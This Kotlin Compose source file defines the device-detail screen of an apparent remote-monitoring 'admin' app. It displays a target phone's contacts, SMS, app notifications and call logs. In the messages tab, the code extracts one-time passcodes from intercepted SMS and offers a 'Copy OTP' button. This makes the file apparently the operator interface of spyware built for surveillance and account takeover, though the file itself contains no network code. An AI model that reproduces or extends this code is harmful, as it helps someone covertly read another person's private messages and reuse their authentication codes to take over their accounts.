package com.datasync.admin.ui

import android.os.Build
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.pager.HorizontalPager
import androidx.compose.foundation.pager.rememberPagerState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.automirrored.filled.Send
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.material3.TabRowDefaults.tabIndicatorOffset
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import com.datasync.admin.ui.viewmodel.DeviceDetailViewModel
import com.datasync.admin.model.*
import com.datasync.admin.formatDate
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class, ExperimentalFoundationApi::class)
@Composable
fun DeviceDetailScreen(deviceId: String, viewModel: DeviceDetailViewModel, onBack: () -> Unit) {
    val scope = rememberCoroutineScope()
    val pagerState = rememberPagerState(pageCount = { 4 })
    var searchQuery by remember { mutableStateOf("") }
    val device by viewModel.device.collectAsStateWithLifecycle()

    val tabs = listOf(
        TabItem("Contacts", Icons.Default.Person),
        TabItem("Messages", Icons.Default.Email),
        TabItem("Notifications", Icons.Default.Notifications),
        TabItem("Calls", Icons.Default.Call)
    )

    Scaffold(
        topBar = {
            Column {
                TopAppBar(
                    title = {
                        Column {
                            Text(device?.deviceName ?: "Device Details", fontWeight = FontWeight.Bold, style = MaterialTheme.typography.titleMedium)
                            Text(deviceId, style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                        }
                    },
                    navigationIcon = {
                        IconButton(onClick = onBack) { Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = null) }
                    },
                    actions = {
                        if (device?.isDemoMode == true) {
                            SuggestionChip(
                                onClick = {},
                                label = { Text("Demo Data") },
                                colors = SuggestionChipDefaults.suggestionChipColors(labelColor = MaterialTheme.colorScheme.secondary)
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                        }
                    }
                )

                StickyHeader(device)

                ScrollableTabRow(
                    selectedTabIndex = pagerState.currentPage,
                    edgePadding = 16.dp,
                    divider = {},
                    indicator = { tabPositions ->
                        if (pagerState.currentPage < tabPositions.size) {
                            TabRowDefaults.SecondaryIndicator(
                                Modifier.tabIndicatorOffset(tabPositions[pagerState.currentPage]),
                                height = 3.dp,
                                color = MaterialTheme.colorScheme.primary
                            )
                        }
                    }
                ) {
                    tabs.forEachIndexed { index, tab ->
                        Tab(
                            selected = pagerState.currentPage == index,
                            onClick = { scope.launch { pagerState.animateScrollToPage(index) } },
                            text = { Text(tab.title) },
                            icon = { Icon(tab.icon, contentDescription = null, modifier = Modifier.size(20.dp)) }
                        )
                    }
                }

                TextField(
                    value = searchQuery,
                    onValueChange = { searchQuery = it },
                    modifier = Modifier.fillMaxWidth().padding(16.dp),
                    placeholder = { Text("Search data...") },
                    leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
                    shape = RoundedCornerShape(16.dp),
                    colors = TextFieldDefaults.colors(
                        focusedIndicatorColor = Color.Transparent,
                        unfocusedIndicatorColor = Color.Transparent
                    )
                )
            }
        }
    ) { padding ->
        HorizontalPager(
            state = pagerState,
            modifier = Modifier.padding(padding).fillMaxSize(),
            verticalAlignment = Alignment.Top
        ) { page ->
            when (page) {
                0 -> ContactsTab(viewModel, searchQuery)
                1 -> MessagesTab(viewModel, searchQuery)
                2 -> NotificationsTab(viewModel, searchQuery)
                3 -> CallsTab(viewModel, searchQuery)
            }
        }
    }
}

@Composable
fun StickyHeader(device: Device?) {
    Card(
        modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 4.dp),
        colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.4f)),
        shape = RoundedCornerShape(12.dp)
    ) {
        Row(
            modifier = Modifier.padding(12.dp).fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text("Hardware: ${device?.manufacturer ?: "Unknown"} ${device?.model ?: "Unknown"}", style = MaterialTheme.typography.bodySmall)
                Text("Sync: ${formatDate(device?.lastSyncTime ?: 0)}", style = MaterialTheme.typography.bodySmall)
            }
            if (device?.isDemoMode == true) {
                Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.secondary, modifier = Modifier.size(16.dp))
            }
        }
    }
}

data class TabItem(val title: String, val icon: ImageVector)

@Composable
fun ContactsTab(viewModel: DeviceDetailViewModel, query: String) {
    val contacts by viewModel.contacts.collectAsStateWithLifecycle()
    val sortedContacts = remember(contacts) { contacts.sortedBy { it.name.lowercase() } }
    val filtered = sortedContacts.filter { it.name.contains(query, true) || it.phone.contains(query) }

    if (filtered.isEmpty() && query.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No contacts found", color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    } else {
        LazyColumn(contentPadding = PaddingValues(bottom = 16.dp), modifier = Modifier.fillMaxSize()) {
            items(filtered, key = { it.phone }) { contact ->
                ListItem(
                    headlineContent = { Text(contact.name, fontWeight = FontWeight.Bold) },
                    supportingContent = { Text(contact.phone) },
                    leadingContent = {
                        Box(
                            modifier = Modifier.size(40.dp).clip(CircleShape).background(MaterialTheme.colorScheme.secondaryContainer),
                            contentAlignment = Alignment.Center
                        ) {
                            Text(contact.name.take(1).uppercase(), color = MaterialTheme.colorScheme.onSecondaryContainer, fontWeight = FontWeight.Bold)
                        }
                    }
                )
                HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
            }
        }
    }
}

@Composable
fun MessagesTab(viewModel: DeviceDetailViewModel, query: String) {
    val messages by viewModel.sms.collectAsStateWithLifecycle()
    var filter by remember { mutableIntStateOf(0) } // 0: All, 1: Inbox, 2: Sent
    val context = LocalContext.current
    val snackbarHostState = remember { SnackbarHostState() }
    val scope = rememberCoroutineScope()

    val filtered = messages.filter {
        (it.address.contains(query, true) || it.body.contains(query, true)) &&
        (filter == 0 || it.type == filter)
    }

    Box(modifier = Modifier.fillMaxSize()) {
        Column(modifier = Modifier.fillMaxSize()) {
            Row(modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                FilterChip(selected = filter == 0, onClick = { filter = 0 }, label = { Text("All") })
                FilterChip(selected = filter == 1, onClick = { filter = 1 }, label = { Text("Inbox") })
                FilterChip(selected = filter == 2, onClick = { filter = 2 }, label = { Text("Sent") })
            }

            if (filtered.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("No messages found", color = MaterialTheme.colorScheme.onSurfaceVariant)
                }
            } else {
                LazyColumn(contentPadding = PaddingValues(bottom = 16.dp), modifier = Modifier.fillMaxSize()) {
                    items(filtered, key = { "${it.address}_${it.date}_${it.body.hashCode()}" }) { sms ->
                        val otp = remember(sms.body) { extractOtp(sms.body) }
                        Card(
                            modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 8.dp),
                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.3f))
                        ) {
                            Column(modifier = Modifier.padding(16.dp)) {
                                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween) {
                                    Text(sms.address, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.primary)
                                    Text(formatDate(sms.date), style = MaterialTheme.typography.labelSmall)
                                }
                                Spacer(modifier = Modifier.height(4.dp))
                                Text(sms.body)
                                Spacer(modifier = Modifier.height(8.dp))
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    SuggestionChip(
                                        onClick = {},
                                        label = { Text(if (sms.type == 1) "Received" else "Sent", fontSize = 10.sp) },
                                        icon = { Icon(if (sms.type == 1) Icons.Default.Email else Icons.AutoMirrored.Filled.Send, null, modifier = Modifier.size(12.dp)) }
                                    )
                                    if (otp != null) {
                                        Button(
                                            onClick = {
                                                copyToClipboard(context, otp)
                                                scope.launch { snackbarHostState.showSnackbar("OTP $otp copied") }
                                            },
                                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 4.dp),
                                            modifier = Modifier.height(32.dp)
                                        ) {
                                            Icon(Icons.Default.Email, contentDescription = null, modifier = Modifier.size(16.dp))
                                            Spacer(modifier = Modifier.width(4.dp))
                                            Text("Copy OTP", fontSize = 12.sp)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        SnackbarHost(hostState = snackbarHostState, modifier = Modifier.align(Alignment.BottomCenter))
    }
}

fun extractOtp(body: String): String? {
    val otpRegex = Regex("\\b\\d{4,8}\\b")
    return otpRegex.find(body)?.value
}

fun copyToClipboard(context: Context, text: String) {
    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
    val clip = ClipData.newPlainText("OTP", text)
    clipboard.setPrimaryClip(clip)
}

@Composable
fun NotificationsTab(viewModel: DeviceDetailViewModel, query: String) {
    val notifications by viewModel.notifications.collectAsStateWithLifecycle()
    val appFilters by viewModel.appFilters.collectAsStateWithLifecycle()
    val selectedApp by viewModel.selectedApp.collectAsStateWithLifecycle()

    val filtered = notifications.filter {
        (selectedApp == "All" || it.appName == selectedApp) &&
        (it.appName.contains(query, true) || it.title.contains(query, true) || it.text.contains(query, true))
    }

    Column(modifier = Modifier.fillMaxSize()) {
        LazyRow(
            modifier = Modifier.fillMaxWidth(),
            contentPadding = PaddingValues(horizontal = 16.dp, vertical = 8.dp),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            items(appFilters.keys.toList()) { app ->
                FilterChip(
                    selected = selectedApp == app,
                    onClick = { viewModel.selectApp(app) },
                    label = {
                        Text("$app (${appFilters[app]})")
                    },
                    leadingIcon = {
                        if (app != "All") {
                            Icon(
                                imageVector = getAppIcon(app.lowercase()),
                                contentDescription = null,
                                modifier = Modifier.size(16.dp)
                            )
                        }
                    }
                )
            }
        }

        if (filtered.isEmpty()) {
            Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                Text("No notifications found", color = MaterialTheme.colorScheme.onSurfaceVariant)
            }
        } else {
            LazyColumn(
                contentPadding = PaddingValues(bottom = 16.dp),
                modifier = Modifier.fillMaxSize()
            ) {
                items(filtered, key = { "${it.packageName}_${it.timestamp}_${it.title.hashCode()}" }) { notification ->
                    ListItem(
                        headlineContent = {
                            Row(verticalAlignment = Alignment.CenterVertically) {
                                Text(notification.appName, style = MaterialTheme.typography.labelMedium, color = MaterialTheme.colorScheme.primary)
                                Spacer(modifier = Modifier.width(8.dp))
                                Text(notification.title, fontWeight = FontWeight.SemiBold, style = MaterialTheme.typography.titleSmall)
                            }
                        },
                        supportingContent = { Text(notification.text) },
                        trailingContent = { Text(formatDate(notification.timestamp), style = MaterialTheme.typography.labelSmall) },
                        leadingContent = {
                            Icon(
                                imageVector = getAppIcon(notification.packageName),
                                contentDescription = null,
                                tint = MaterialTheme.colorScheme.secondary,
                                modifier = Modifier.size(28.dp)
                            )
                        }
                    )
                    HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
                }
            }
        }
    }
}

@Composable
fun CallsTab(viewModel: DeviceDetailViewModel, query: String) {
    val calls by viewModel.callLogs.collectAsStateWithLifecycle()
    val filtered = calls.filter { it.name.contains(query, true) || it.number.contains(query) }

    if (filtered.isEmpty()) {
        Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
            Text("No call logs found", color = MaterialTheme.colorScheme.onSurfaceVariant)
        }
    } else {
        LazyColumn(contentPadding = PaddingValues(bottom = 16.dp), modifier = Modifier.fillMaxSize()) {
            items(filtered, key = { "${it.number}_${it.date}" }) { call ->
                ListItem(
                    headlineContent = { Text(if (call.name == "Unknown" || call.name.isBlank()) call.number else call.name, fontWeight = FontWeight.Bold) },
                    supportingContent = {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(
                                imageVector = getCallTypeIcon(call.type),
                                contentDescription = null,
                                modifier = Modifier.size(14.dp),
                                tint = getCallTypeColor(call.type)
                            )
                            Spacer(modifier = Modifier.width(4.dp))
                            Text("${call.number} • ${call.duration}s")
                        }
                    },
                    trailingContent = { Text(formatDate(call.date), style = MaterialTheme.typography.labelSmall) }
                )
                HorizontalDivider(modifier = Modifier.padding(horizontal = 16.dp), thickness = 0.5.dp)
            }
        }
    }
}

fun getAppIcon(packageName: String): ImageVector {
    return when {
        packageName.contains("whatsapp") -> Icons.Default.Email
        packageName.contains("facebook") || packageName.contains("messenger") -> Icons.Default.Face
        packageName.contains("instagram") -> Icons.Default.AccountBox
        packageName.contains("gmail") -> Icons.Default.Email
        else -> Icons.Default.Notifications
    }
}

fun getCallTypeIcon(type: Int): ImageVector {
    return when (type) {
        1 -> Icons.Default.Call // Incoming
        2 -> Icons.AutoMirrored.Filled.Send // Outgoing
        3 -> Icons.Default.Call // Missed
        else -> Icons.Default.Call
    }
}

@Composable
fun getCallTypeColor(type: Int): Color {
    return when (type) {
        1 -> Color(0xFF4CAF50) // Green
        2 -> Color(0xFF2196F3) // Blue
        3 -> Color(0xFFF44336) // Red
        else -> MaterialTheme.colorScheme.outline
    }
}
